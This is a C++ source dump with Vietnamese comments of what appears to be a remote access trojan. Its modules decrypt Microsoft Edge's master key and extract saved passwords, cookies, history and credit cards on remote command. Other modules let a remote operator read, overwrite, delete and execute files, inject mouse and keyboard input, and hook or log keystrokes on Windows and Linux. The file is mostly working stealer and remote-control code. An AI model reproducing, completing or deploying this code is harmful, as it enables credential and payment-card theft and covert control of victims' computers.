    sqlite3* db = nullptr;
    if (sqlite3_open_v2(tempPath.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        DeleteFileA(tempPath.c_str());
        return cards;
    }
    
    // Kiểm tra bảng credit_cards
    sqlite3_stmt* checkStmt;
    const char* checkSql = "SELECT name FROM sqlite_master WHERE type='table' AND name='credit_cards'";
    
    bool hasTable = false;
    if (sqlite3_prepare_v2(db, checkSql, -1, &checkStmt, nullptr) == SQLITE_OK) {
        if (sqlite3_step(checkStmt) == SQLITE_ROW) {
            hasTable = true;
        }
        sqlite3_finalize(checkStmt);
    }
    
    if (!hasTable) {
        sqlite3_close(db);
        DeleteFileA(tempPath.c_str());
        return cards;
    }
    
    // Query đơn giản
    std::string sql = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards LIMIT 10";
    sqlite3_stmt* stmt;
    
    if (sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
        sqlite3_close(db);
        DeleteFileA(tempPath.c_str());
        return cards;
    }
    
    std::vector<unsigned char> masterKey = getMasterKey();
    
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        json card;
        
        // Name
        const unsigned char* name = sqlite3_column_text(stmt, 0);
        if (name) card["name"] = reinterpret_cast<const char*>(name);
        
        // Expiration
        card["exp_month"] = sqlite3_column_int(stmt, 1);
        card["exp_year"] = sqlite3_column_int(stmt, 2);
        
        // Card number (encrypted)
        int blobSize = sqlite3_column_bytes(stmt, 3);
        const void* blobData = sqlite3_column_blob(stmt, 3);
        
        if (blobData && blobSize > 0) {
            card["number"] = "[ENCRYPTED]";
            card["encrypted_size"] = blobSize;
            
            // Có thể thử giải mã nếu có master key
            if (!masterKey.empty()) {
                // Thử giải mã ở đây nếu cần
            }
        }
        
        cards.push_back(card);
    }
    
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFileA(tempPath.c_str());
    
    return cards;
}

// ==================== MAIN EXTRACTION FUNCTION ====================

json EdgeManager::extractEdgeData() {
    json result;
    
    try {
        std::cout << "\n=== EDGE DATA EXTRACTION ===\n" << std::endl;
        
        // 1. Master key (quan trọng nhưng không bắt buộc)
        std::cout << "[1/5] Getting master key..." << std::endl;
        std::vector<unsigned char> masterKey = getMasterKey();
        if (!masterKey.empty()) {
            std::cout << "✓ Master key: FOUND (" << masterKey.size() << " bytes)" << std::endl;
            result["master_key_status"] = "FOUND";
        } else {
            std::cout << "✗ Master key: NOT FOUND (some passwords may be encrypted)" << std::endl;
            result["master_key_status"] = "NOT_FOUND";
        }
        
        // 2. Cookies
        std::cout << "[2/5] Extracting cookies..." << std::endl;
        result["cookies"] = extractCookies();
        std::cout << "✓ Cookies: " << result["cookies"].size() << std::endl;
        
        // 3. Passwords
        std::cout << "[3/5] Extracting passwords..." << std::endl;
        result["passwords"] = extractPasswords();
        std::cout << "✓ Passwords: " << result["passwords"].size() << std::endl;
        
        // 4. History
        std::cout << "[4/5] Extracting history..." << std::endl;
        result["history"] = extractHistory();
        std::cout << "✓ History: " << result["history"].size() << std::endl;
        
        // 5. Bookmarks
        std::cout << "[5/5] Extracting bookmarks..." << std::endl;
        result["bookmarks"] = extractBookmarks();
        std::cout << "✓ Bookmarks: " << result["bookmarks"].size() << std::endl;
        
        // 6. Credit cards (optional)
        std::cout << "[+] Checking credit cards..." << std::endl;
        result["credit_cards"] = extractCreditCards();
        std::cout << "✓ Credit Cards: " << result["credit_cards"].size() << std::endl;
        
        std::cout << "\n=== EXTRACTION COMPLETE ===\n" << std::endl;
        
    } catch (const std::exception& e) {
        std::cerr << "[ERROR] Extraction failed: " << e.what() << std::endl;
        result["error"] = e.what();
    }
    
    return result;
}

// ==================== COMMAND HANDLER ====================

json EdgeManager::handle_command(const json& request) {
    try {
        if (!request.contains("command")) {
            return {{"status", "error"}, {"message", "Missing command"}};
        }
        
        std::string command = request["command"].get<std::string>();
        
        if (command == "EXTRACT_ALL") {
            json result = extractEdgeData();
            result["status"] = "success";
            result["module"] = "EDGE";
            return result;
            
        } else if (command == "GET_PASSWORDS") {
            json passwords = extractPasswords();
            return {
                {"status", "success"},
                {"module", "EDGE"},
                {"command", "GET_PASSWORDS"},
                {"count", passwords.size()},
                {"data", passwords}
            };
            
        } else if (command == "GET_COOKIES") {
            json cookies = extractCookies();
            return {
                {"status", "success"},
                {"module", "EDGE"},
                {"command", "GET_COOKIES"},
                {"count", cookies.size()},
                {"data", cookies}
            };
            
        } else if (command == "GET_HISTORY") {
            json history = extractHistory();
            return {
                {"status", "success"},
                {"module", "EDGE"},
                {"command", "GET_HISTORY"},
                {"count", history.size()},
                {"data", history}
            };
            
        } else if (command == "GET_BOOKMARKS") {
            json bookmarks = extractBookmarks();
            return {
                {"status", "success"},
                {"module", "EDGE"},
                {"command", "GET_BOOKMARKS"},
                {"count", bookmarks.size()},
                {"data", bookmarks}
            };
            
        } else if (command == "GET_CREDIT_CARDS") {
            json cards = extractCreditCards();
            return {
                {"status", "success"},
                {"module", "EDGE"},
                {"command", "GET_CREDIT_CARDS"},
                {"count", cards.size()},
                {"data", cards}
            };
            
        } else if (command == "TEST") {
            // Kiểm tra file tồn tại
            std::string basePath = getAppDataPath() + "\\Microsoft\\Edge\\User Data\\Default\\";
            
            json fileStatus;
            
            // Kiểm tra từng file
            auto checkFile = [&](const std::string& name, const std::string& path) {
                bool exists = GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES;
                fileStatus[name] = exists ? "FOUND" : "NOT_FOUND";
                
                if (exists) {
                    std::ifstream file(path, std::ios::binary | std::ios::ate);
                    if (file.is_open()) {
                        std::streamsize size = file.tellg();
                        file.close();
                        fileStatus[name + "_size"] = std::to_string(size) + " bytes";
                    }
                }
            };
            
            checkFile("Local State", getLocalStatePath());
            checkFile("Cookies", basePath + "Cookies");
            checkFile("Network Cookies", basePath + "Network\\Cookies");
            checkFile("Login Data", basePath + "Login Data");
            checkFile("History", basePath + "History");
            checkFile("Bookmarks", basePath + "Bookmarks");
            checkFile("Web Data", basePath + "Web Data");
            
            // Master key
            std::vector<unsigned char> masterKey = getMasterKey();
            
            return {
                {"status", "success"},
                {"module", "EDGE"},
                {"test_results", fileStatus},
                {"master_key", !masterKey.empty() ? "AVAILABLE" : "UNAVAILABLE"},
                {"master_key_size", masterKey.size()}
            };
            
        } else if (command == "DEBUG_MASTER_KEY") {
            // Debug chi tiết master key
            std::string localStatePath = getLocalStatePath();
            std::ifstream file(localStatePath, std::ios::binary);
            
            json debugInfo;
            debugInfo["local_state_path"] = localStatePath;
            
            if (!file.is_open()) {
                debugInfo["error"] = "Cannot open file";
                return {{"status", "error"}, {"debug", debugInfo}};
            }
            
            std::string content((std::istreambuf_iterator<char>(file)), 
                               std::istreambuf_iterator<char>());
            file.close();
            
            // Tìm os_crypt section
            size_t osCryptStart = content.find("\"os_crypt\"");
            if (osCryptStart != std::string::npos) {
                size_t osCryptEnd = content.find("}", osCryptStart);
                if (osCryptEnd != std::string::npos) {
                    std::string osCryptSection = content.substr(osCryptStart, osCryptEnd - osCryptStart + 1);
                    debugInfo["os_crypt_section"] = osCryptSection;
                    
                    // Tìm encrypted_key
                    size_t keyStart = osCryptSection.find("\"encrypted_key\":\"");
                    if (keyStart != std::string::npos) {
                        keyStart += 17;
                        size_t keyEnd = osCryptSection.find("\"", keyStart);
                        if (keyEnd != std::string::npos) {
                            std::string keyB64 = osCryptSection.substr(keyStart, keyEnd - keyStart);
                            debugInfo["encrypted_key_b64"] = keyB64;
                            
                            // Decode
                            std::vector<unsigned char> decoded = base64Decode(keyB64);
                            debugInfo["decoded_size"] = decoded.size();
                            
                            if (decoded.size() > 0) {
                                // Hex dump
                                std::stringstream hex;
                                hex << std::hex << std::setfill('0');
                                for (size_t i = 0; i < std::min(decoded.size(), (size_t)32); i++) {
                                    hex << std::setw(2) << (int)decoded[i] << " ";
                                }
                                debugInfo["decoded_hex"] = hex.str();
                                
                                // Check for v10 prefix
                                if (decoded.size() > 3 && 
                                    decoded[0] == 'v' && 
                                    decoded[1] == '1' && 
                                    decoded[2] == '0') {
                                    debugInfo["has_v10_prefix"] = true;
                                    debugInfo["data_after_v10_size"] = decoded.size() - 3;
                                }
                            }
                        }
                    }
                }
            }
            
            // Thử DPAPI
            std::vector<unsigned char> masterKey = getMasterKey();
            debugInfo["master_key_found"] = !masterKey.empty();
            debugInfo["master_key_size"] = masterKey.size();
            
            if (!masterKey.empty()) {
                std::stringstream hex;
                hex << std::hex << std::setfill('0');
                for (size_t i = 0; i < std::min(masterKey.size(), (size_t)16); i++) {
                    hex << std::setw(2) << (int)masterKey[i] << " ";
                }
                debugInfo["master_key_hex"] = hex.str();
            }
            
            return {{"status", "success"}, {"debug", debugInfo}};
            
        } else {
            return {
                {"status", "error"},
                {"module", "EDGE"},
                {"message", "Unknown command: " + command}
            };
        }
        
    } catch (const std::exception& e) {
        return {
            {"status", "error"},
            {"module", "EDGE"},
            {"message", e.what()}
        };
    }
}


/* ===== FILE: ./src/modules/encryption_utils.hpp ===== */

#pragma once
#include <vector>
#include <string>

namespace EncryptionUtils {
    
    // DPAPI Functions
    std::vector<unsigned char> decryptDPAPIWin(const std::vector<unsigned char>& encrypted);
    
    // AES-GCM Functions using OpenSSL
    std::vector<unsigned char> decryptAESGCMOpenSSL(
        const std::vector<unsigned char>& ciphertext,
        const std::vector<unsigned char>& key,
        const std::vector<unsigned char>& iv);
    
    // Base64 Functions
    std::vector<unsigned char> base64DecodeWin(const std::string& encoded);
    std::string base64EncodeWin(const unsigned char* data, size_t length);
    
    // Key Extraction
    std::string extractMasterKeyFromLocalState(const std::string& localStatePath);
    
} // namespace EncryptionUtils


/* ===== FILE: ./src/modules/FileManager.hpp ===== */

#pragma once
#include "../interfaces/IRemoteModule.hpp"
#include <string>
#include <vector>
#include <nlohmann/json.hpp>

class FileManager : public IRemoteModule {
public:
    const std::string& get_module_name() const override {
        static const std::string name = "FILE";
        return name;
    }

    json handle_command(const json& request) override;

    // Hàm hỗ trợ đọc file nhị phân (Static để Main gọi dễ dàng)
    static bool read_file_binary(const std::string& filename, std::vector<uint8_t>& out_data);
};


/* ===== FILE: ./src/modules/FileManager_linux.cpp ===== */

#include "FileManager.hpp"
#include <iostream>
#include <fstream>

// Hàm xử lý lệnh từ Client (bắt buộc do kế thừa IRemoteModule)
json FileManager::handle_command(const json& request) {
    return {
        {"status", "error"}, 
        {"message", "[Linux] FileManager chưa được hỗ trợ đầy đủ."}
    };
}

// Hàm đọc file nhị phân (Main đang gọi hàm này)
// Tôi viết tạm logic đọc file cơ bản để bạn dùng được luôn nếu cần
bool FileManager::read_file_binary(const std::string& filepath, std::vector<uint8_t>& out_buffer) {
    std::ifstream file(filepath, std::ios::binary);
    if (!file.is_open()) {
        return false;
    }

    // Lấy kích thước file
    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    // Đọc dữ liệu
    out_buffer.resize(fileSize);
    file.read(reinterpret_cast<char*>(out_buffer.data()), fileSize);
    
    return true;
}


/* ===== FILE: ./src/modules/FileManager_win.cpp ===== */

#include "FileManager.hpp"
#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>
#include <algorithm>
#include <sstream> // Cho string stream
#ifdef _WIN32
#include <windows.h>
#include <shellapi.h> // <--- Bắt buộc để dùng ShellExecute
#endif
namespace fs = std::filesystem;

// --- HELPER: BASE64 DECODE (Để nhận video từ JSON) ---
static const std::string base64_chars = 
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "abcdefghijklmnopqrstuvwxyz"
             "0123456789+/";

static bool is_base64(unsigned char c) {
  return (isalnum(c) || (c == '+') || (c == '/'));
}

std::vector<unsigned char> base64_decode(std::string const& encoded_string) {
  int in_len = encoded_string.size();
  int i = 0; int j = 0; int in_ = 0;
  unsigned char char_array_4[4], char_array_3[3];
  std::vector<unsigned char> ret;

  while (in_len-- && ( encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
    char_array_4[i++] = encoded_string[in_]; in_++;
    if (i ==4) {
      for (i = 0; i <4; i++)
        char_array_4[i] = base64_chars.find(char_array_4[i]);
      char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
      char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
      char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
      for (i = 0; (i < 3); i++) ret.push_back(char_array_3[i]);
      i = 0;
    }
  }
  if (i) {
    for (j = i; j <4; j++) char_array_4[j] = 0;
    for (j = 0; j <4; j++) char_array_4[j] = base64_chars.find(char_array_4[j]);
    char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
    char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
    for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
  }
  return ret;
}

// ----------------------------------------------------

json FileManager::handle_command(const json& request) {
    std::string cmd = request.value("command", "");
    
    // 1. LIST_DIR (Liệt kê file/ổ đĩa)
    if (cmd == "LIST_DIR") {
        json file_list = json::array();
        std::string req_path = "";
        if (request.contains("payload") && request["payload"].contains("path")) {
            req_path = request["payload"]["path"];
        }

        // Nếu path rỗng -> Trả về danh sách ổ đĩa (C:\, D:\)
        if (req_path.empty()) {
            #ifdef _WIN32
                char buffer[256];
                GetLogicalDriveStringsA(256, buffer);
                char* drive = buffer;
                while (*drive) {
                    file_list.push_back({ {"name", std::string(drive)}, {"type", "drive"}, {"path", std::string(drive)} });
                    drive += strlen(drive) + 1;
                }
                return {{"status", "success"}, {"module", "FILE"}, {"command", "LIST_DIR"}, {"current_path", ""}, {"data", file_list}};
            #else
                req_path = "/";
            #endif
        }

        try {
            if (fs::exists(req_path) && fs::is_directory(req_path)) {
                for (const auto& entry : fs::directory_iterator(req_path)) {
                    try {
                        std::string filename = entry.path().filename().string();
                        std::string type = entry.is_directory() ? "dir" : "file";
                        uintmax_t size = (!entry.is_directory()) ? entry.file_size() : 0;
                        
                        // Detect extension
                        std::string ext = entry.path().extension().string();
                        std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
                        if(ext == ".webm" || ext == ".mp4") type = "video";
                        if(ext == ".jpg" || ext == ".png") type = "image";

                        file_list.push_back({
                            {"name", filename}, {"type", type}, {"size", size}, {"path", entry.path().string()}
                        });
                    } catch (...) { continue; }
                }
                return {{"status", "success"}, {"module", "FILE"}, {"command", "LIST_DIR"}, 
                        {"current_path", fs::absolute(req_path).string()}, {"data", file_list}};
            }
        } catch (const std::exception& e) { return {{"status", "error"}, {"message", e.what()}}; }
    }

    // 2. READ_TEXT (Đọc nội dung file gửi về Client sửa)
    else if (cmd == "READ_TEXT") {
        std::string path = request["payload"].value("path", "");
        std::ifstream file(path);
        if (file.is_open()) {
            std::stringstream buffer;
            buffer << file.rdbuf();
            return {
                {"status", "success"}, 
                {"module", "FILE"}, 
                {"command", "READ_TEXT"}, 
                {"path", path},
                {"content", buffer.str()} // Nội dung file
            };
        }
        return {{"status", "error"}, {"message", "Cannot open file"}};
    }

    // 3. WRITE_TEXT (Ghi đè nội dung file - Cẩn thận khi dùng!)
    else if (cmd == "WRITE_TEXT") {
        std::string path = request["payload"].value("path", "");
        std::string content = request["payload"].value("content", "");
        
        std::ofstream file(path, std::ios::trunc); // Truncate = Xóa cũ ghi mới
        if (file.is_open()) {
            file << content;
            return {{"status", "success"}, {"message", "File saved successfully"}};
        }
        return {{"status", "error"}, {"message", "Cannot write file (Access Denied?)"}};
    }

    // 4. EXECUTE (Chạy file .exe, .bat...)
    else if (cmd == "EXECUTE") {
        std::string path = request["payload"].value("path", "");
        #ifdef _WIN32
            ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_SHOWNORMAL);
            return {{"status", "success"}, {"message", "Executed"}};
        #endif
    }

    // 5. DELETE (Xóa file/folder)
    else if (cmd == "DELETE") {
        std::string path = request["payload"].value("path", "");
        try {
            if (fs::remove_all(path)) return {{"status", "success"}, {"message", "Deleted"}};
        } catch (...) {}
        return {{"status", "error"}, {"message", "Delete failed"}};
    }

    // 1. LIST: Liệt kê cả ảnh và video
    if (cmd == "LIST") {
        json file_list = json::array();
        std::string path = "captured_data";
        if (!fs::exists(path)) fs::create_directory(path);

        if (fs::exists(path) && fs::is_directory(path)) {
            for (const auto& entry : fs::directory_iterator(path)) {
                std::string ext = entry.path().extension().string();
                if (ext == ".jpg" || ext == ".webm" || ext == ".mp4") {
                    file_list.push_back({
                        {"name", entry.path().filename().string()},
                        {"size", entry.file_size()},
                        {"type", (ext == ".jpg" ? "image" : "video")}
                    });
                }
            }
        }
        return {
            {"status", "success"}, {"module", "FILE"},
            {"command", "LIST"}, {"data", file_list}
        };
    }

    // [MỚI] LỆNH THỰC THI FILE (Mở file trên máy Server)
    if (cmd == "EXECUTE") {
        std::string path = request["payload"].value("path", "");
        
        if (path.empty()) return {{"status", "error"}, {"message", "Missing path"}};

        #ifdef _WIN32
            // ShellExecute tự động chọn ứng dụng phù hợp để mở file
            // (VD: .txt mở bằng Notepad, .png mở bằng Photos, .exe thì chạy luôn)
            HINSTANCE result = ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_SHOWNORMAL);
            
            if ((intptr_t)result > 32) {
                return {{"status", "success"}, {"message", "File executed successfully"}};
            } else {
                return {{"status", "error"}, {"message", "Failed to execute file"}};
            }
        #else
            // Code đơn giản cho Linux (nếu cần)
            std::string cmd_linux = "xdg-open \"" + path + "\" &";
            system(cmd_linux.c_str());
            return {{"status", "success"}, {"message", "Executed command"}};
        #endif
    }
    
    // 2. SAVE_VIDEO: Nhận video từ Client và lưu xuống ổ cứng
    else if (cmd == "SAVE_VIDEO") {
        if (request.contains("payload")) {
            std::string name = request["payload"].value("name", "video.webm");
            std::string b64Data = request["payload"].value("data", "");
            
            if (!b64Data.empty()) {
                std::vector<unsigned char> binaryData = base64_decode(b64Data);
                
                std::string path = "captured_data/" + name;
                std::ofstream file(path, std::ios::binary);
                if (file.is_open()) {
                    file.write(reinterpret_cast<const char*>(binaryData.data()), binaryData.size());
                    file.close();
                    std::cout << "[FILE] Video saved: " << path << " (" << binaryData.size() << " bytes)\n";
                    return {{"status", "success"}, {"message", "Video saved successfully"}};
                }
            }
        }
        return {{"status", "error"}, {"message", "Failed to save video"}};
    }

    return {{"status", "ok"}}; 
}

// Giữ nguyên hàm read_file_binary cũ
bool FileManager::read_file_binary(const std::string& filename, std::vector<uint8_t>& out_data) {
    std::string full_path = "captured_data/" + filename;
    std::ifstream file(full_path, std::ios::binary);
    if (!file.is_open()) return false;
    file.seekg(0, std::ios::end);
    size_t size = file.tellg();
    file.seekg(0, std::ios::beg);
    out_data.resize(size);
    file.read(reinterpret_cast<char*>(out_data.data()), size);
    return true;
}


/* ===== FILE: ./src/modules/InputManager.hpp ===== */

#pragma once
#include "../interfaces/IRemoteModule.hpp"

// --- PHÂN CHIA HỆ ĐIỀU HÀNH ---
#if defined(_WIN32)
    #include <windows.h>
#elif defined(__linux__)
    #include <X11/Xlib.h>
    #include <X11/extensions/XTest.h> // Thư viện giả lập Input trên Linux
#endif
// ------------------------------

class InputManager : public IRemoteModule {
public:
    const std::string& get_module_name() const override {
        static const std::string name = "INPUT";
        return name;
    }

    json handle_command(const json& request) override;

private:
    void move_mouse(double x, double y); // Nhận toạ độ tỉ lệ 0.0 -> 1.0
    void mouse_btn(const std::string& btn, const std::string& action); // left/right, down/up
    void mouse_scroll(int delta);
    void key_event(int key_code, bool is_down);
};


/* ===== FILE: ./src/modules/InputManager_linux.cpp ===== */

#include "InputManager.hpp"
#include <iostream>

// Cần định nghĩa Display nếu muốn dùng XTest sau này, giờ để tạm NULL
// Display* display = nullptr; 

json InputManager::handle_command(const json& request) {
    // Parser lệnh từ JSON và gọi các hàm private tương ứng
    // Hiện tại trả về thông báo chưa hỗ trợ để test server
    return {
        {"status", "success"}, 
        {"message", "[Linux] Input received but not executed (Dummy Mode)"}
    };
}

void InputManager::move_mouse(double x, double y) {
    // Code di chuyển chuột Linux (XTest) sẽ viết ở đây
}

void InputManager::mouse_btn(const std::string& btn, const std::string& action) {
    // Code click chuột Linux sẽ viết ở đây
}

void InputManager::mouse_scroll(int delta) {
    // Code cuộn chuột Linux sẽ viết ở đây
}

void InputManager::key_event(int key_code, bool is_down) {
    // Code nhấn phím Linux sẽ viết ở đây
}


/* ===== FILE: ./src/modules/InputManager_win.cpp ===== */

#include "InputManager.hpp"
#include <iostream>

// Helper lấy độ phân giải (chỉ dùng để tham khảo debug nếu cần, không dùng để tính toán toạ độ)
static int GetScreenWidth() { return GetSystemMetrics(SM_CXSCREEN); }
static int GetScreenHeight() { return GetSystemMetrics(SM_CYSCREEN); }

json InputManager::handle_command(const json& request) {
    std::string cmd = request.value("command", "");
    json p = request.value("payload", json::object());

    if (cmd == "MOUSE_MOVE") {
        // Nhận toạ độ tỉ lệ từ 0.0 đến 1.0 từ Client
        move_mouse(p.value("x", 0.0), p.value("y", 0.0));
    }
    else if (cmd == "MOUSE_BTN") {
        mouse_btn(p.value("btn", "left"), p.value("type", "down"));
    }
    else if (cmd == "MOUSE_WHEEL") {
        mouse_scroll(p.value("delta", 0));
    }
    else if (cmd == "KEY_EVENT") {
        bool is_down = (p.value("type", "up") == "down");   
        int key = p.value("key", 0);
        key_event(key, is_down);
    }
    return {{"status", "ok"}};
}

// 1. DI CHUYỂN CHUỘT (SỬA LẠI ĐỂ KHẮC PHỤC LỆCH DPI)
void InputManager::move_mouse(double x, double y) {
    // Windows SendInput sử dụng hệ toạ độ tuyệt đối từ 0 đến 65535 cho toàn bộ màn hình
    // Bất kể độ phân giải là 1920x1080 hay 4K, toạ độ 65535,65535 luôn là góc dưới phải.
    // Việc này giúp tránh sai số do DPI Scaling (Zoom 125%, 150%) của Windows.
    
    int absX = static_cast<int>(x * 65535);
    int absY = static_cast<int>(y * 65535);

    INPUT input = {0};
    input.type = INPUT_MOUSE;
    // MOUSEEVENTF_ABSOLUTE: Chỉ định dùng toạ độ tuyệt đối (0-65535)
    // MOUSEEVENTF_VIRTUALDESK: Hỗ trợ đa màn hình (nếu có)
    input.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;
    input.mi.dx = absX;
    input.mi.dy = absY;
    
    SendInput(1, &input, sizeof(INPUT));
}

// 2. CLICK CHUỘT
void InputManager::mouse_btn(const std::string& btn, const std::string& action) {
    INPUT input = {0};
    input.type = INPUT_MOUSE;
    
    if (btn == "left") {
        input.mi.dwFlags = (action == "down") ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_LEFTUP;
    } else if (btn == "right") {
        input.mi.dwFlags = (action == "down") ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_RIGHTUP;
    } else if (btn == "middle") {
        input.mi.dwFlags = (action == "down") ? MOUSEEVENTF_MIDDLEDOWN : MOUSEEVENTF_MIDDLEUP;
    }
    SendInput(1, &input, sizeof(INPUT));
}

// 3. LĂN CHUỘT
void InputManager::mouse_scroll(int delta) {
    INPUT input = {0};
    input.type = INPUT_MOUSE;
    input.mi.dwFlags = MOUSEEVENTF_WHEEL;
    input.mi.mouseData = (DWORD)delta;
    SendInput(1, &input, sizeof(INPUT));
}

// 4. BÀN PHÍM
void InputManager::key_event(int vk_code, bool is_down) {
    INPUT input = {0};
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = (WORD)vk_code;
    
    if (!is_down) {
        input.ki.dwFlags = KEYEVENTF_KEYUP;
    }
    SendInput(1, &input, sizeof(INPUT));
}


/* ===== FILE: ./src/modules/KeyManager.hpp ===== */

// KeyManager.hpp
#pragma once
#include <string>
#include <functional>
#include <thread>
#include <nlohmann/json.hpp>
#include "../interfaces/IRemoteModule.hpp"

#if _WIN32
#include <windows.h>
#else
#include <map>
#include <fstream>
#include <atomic>
#include <fcntl.h>      // open
#include <unistd.h>     // close, read
#include <linux/input.h>// struct input_event, KEY_*
#include <dirent.h>     // scandir
#include <cstring>
#endif

using json = nlohmann::json;

// Định nghĩa kiểu hàm callback: nhận vào ký tự phím (string)
using KeyCallback = std::function<void(std::string key_char)>;

class KeyManager : public IRemoteModule {
public:
    // --- Bắt buộc implement từ IRemoteModule ---
    const std::string& get_module_name() const override;
    json handle_command(const json& request) override;

    // --- Các hàm quản lý Hook ---
    // Callback cần là static vì Windows Hook là hàm toàn cục (Global C-style function)
    static void set_callback(KeyCallback cb);
    
    void start_hook();
    void stop_hook();
    
    // Hàm khóa phím (static để gọi được từ trong Hook Procedure nếu cần)
    static void set_locked(bool locked);

private:
    std::thread hookThread;
};


/* ===== FILE: ./src/modules/KeyManager_linux.cpp ===== */

#include "modules/KeyManager.hpp"
#include <iostream>
#include <vector>
#include <map>
#include <atomic>
#include <thread>
#include <mutex>
#include <algorithm>
#include <cstring>

// Linux specific headers
#include <fcntl.h>      // open
#include <unistd.h>     // close, read, write
#include <dirent.h>     // scandir
#include <linux/input.h>// input_event, KEY_*, EVIOCGRAB
#include <sys/ioctl.h>  // ioctl

// ============================================================
// PHẦN BIẾN TOÀN CỤC (GLOBAL)
// ============================================================
static KeyCallback g_callback = nullptr;
static std::atomic<bool> g_running{false};
static std::atomic<bool> g_isLocked{false}; // Trạng thái khóa
static int g_fd = -1; // File descriptor của thiết bị bàn phím

// Biến theo dõi trạng thái phím bổ trợ để xử lý tổ hợp phím
static bool g_ctrl_pressed = false;
static bool g_alt_pressed = false;

// Map ánh xạ mã phím Linux sang String
static std::map<int, std::string> g_keyMap = {
    {KEY_A, "a"}, {KEY_B, "b"}, {KEY_C, "c"}, {KEY_D, "d"}, {KEY_E, "e"},
    {KEY_F, "f"}, {KEY_G, "g"}, {KEY_H, "h"}, {KEY_I, "i"}, {KEY_J, "j"},
    {KEY_K, "k"}, {KEY_L, "l"}, {KEY_M, "m"}, {KEY_N, "n"}, {KEY_O, "o"},
    {KEY_P, "p"}, {KEY_Q, "q"}, {KEY_R, "r"}, {KEY_S, "s"}, {KEY_T, "t"},
    {KEY_U, "u"}, {KEY_V, "v"}, {KEY_W, "w"}, {KEY_X, "x"}, {KEY_Y, "y"}, {KEY_Z, "z"},
    {KEY_1, "1"}, {KEY_2, "2"}, {KEY_3, "3"}, {KEY_4, "4"}, {KEY_5, "5"},
    {KEY_6, "6"}, {KEY_7, "7"}, {KEY_8, "8"}, {KEY_9, "9"}, {KEY_0, "0"},
    {KEY_ENTER, "\n"}, {KEY_KPENTER, "\n"},
    {KEY_SPACE, " "}, {KEY_BACKSPACE, "[BACK]"},
    {KEY_TAB, "[TAB]"}, {KEY_ESC, "[ESC]"}, 
    {KEY_LEFTSHIFT, "[SHIFT]"}, {KEY_RIGHTSHIFT, "[SHIFT]"},
    {KEY_LEFTCTRL, "[CTRL]"}, {KEY_RIGHTCTRL, "[CTRL]"},
    {KEY_LEFTALT, "[ALT]"}, {KEY_RIGHTALT, "[ALT]"},
    {KEY_DOT, "."}, {KEY_COMMA, ","}, {KEY_MINUS, "-"}, {KEY_EQUAL, "="},
    {KEY_SLASH, "/"}, {KEY_SEMICOLON, ";"}, {KEY_APOSTROPHE, "'"},
    {KEY_CAPSLOCK, "[CAPS]"}, 
    {KEY_UP, "[UP]"}, {KEY_DOWN, "[DOWN]"}, {KEY_LEFT, "[LEFT]"}, {KEY_RIGHT, "[RIGHT]"}
};

// ============================================================
// CÁC HÀM HELPER (NỘI BỘ)
// ============================================================

// Tìm thiết bị bàn phím trong /dev/input/by-path/
// Cách này ổn định hơn là đoán event0, event1...
std::string find_keyboard_device() {
    const std::string path_dir = "/dev/input/by-path/";
    DIR* dir = opendir(path_dir.c_str());
    if (!dir) return ""; // Không mở được thư mục

    struct dirent* entry;
    std::string device_path = "";

    while ((entry = readdir(dir)) != NULL) {
        std::string filename = entry->d_name;
        // Tìm file kết thúc bằng "-event-kbd" -> Đây thường là bàn phím vật lý
        if (filename.length() > 10 && 
            filename.substr(filename.length() - 10) == "-event-kbd") {
            device_path = path_dir + filename;
            break;
        }
    }
    closedir(dir);
    
    // Fallback nếu không tìm thấy by-path (thường xảy ra trên máy ảo hoặc docker)
    if (device_path.empty()) {
        // Thử mở event0 (thường là keyboard trên nhiều hệ thống đơn giản)
        // Trong thực tế nên check /proc/bus/input/devices để chính xác hơn
        return "/dev/input/event0"; 
    }
    return device_path;
}

// Vòng lặp chính xử lý sự kiện
void hook_loop() {
    std::string dev_path = find_keyboard_device();
    std::cout << "[KEYBOARD] Opening device: " << dev_path << "\n";

    // Phải mở file với quyền root (sudo)
    g_fd = open(dev_path.c_str(), O_RDONLY);
    if (g_fd == -1) {
        std::cerr << "[KEYBOARD] ERROR: Cannot open device (Run as Root/Sudo?)\n";
        g_running = false;
        return;
    }

    struct input_event ev;
    
    while (g_running) {
        // Đọc blocking, sẽ dừng ở đây chờ phím nhấn
        ssize_t n = read(g_fd, &ev, sizeof(ev));
        
        // Nếu lỗi hoặc bị đóng file (do stop_hook)
        if (n == (ssize_t)-1 || !g_running) {
            break; 
        }

        // Chỉ xử lý sự kiện Key (EV_KEY)
        if (ev.type == EV_KEY) {
            // value: 0 = Release, 1 = Press, 2 = Hold (Repeat)
            bool is_pressed = (ev.value == 1); // Chỉ lấy sự kiện nhấn xuống

            // 1. Cập nhật trạng thái phím bổ trợ (cho logic Unlock)
            if (ev.code == KEY_LEFTCTRL || ev.code == KEY_RIGHTCTRL) g_ctrl_pressed = (ev.value != 0);
            if (ev.code == KEY_LEFTALT || ev.code == KEY_RIGHTALT)   g_alt_pressed = (ev.value != 0);

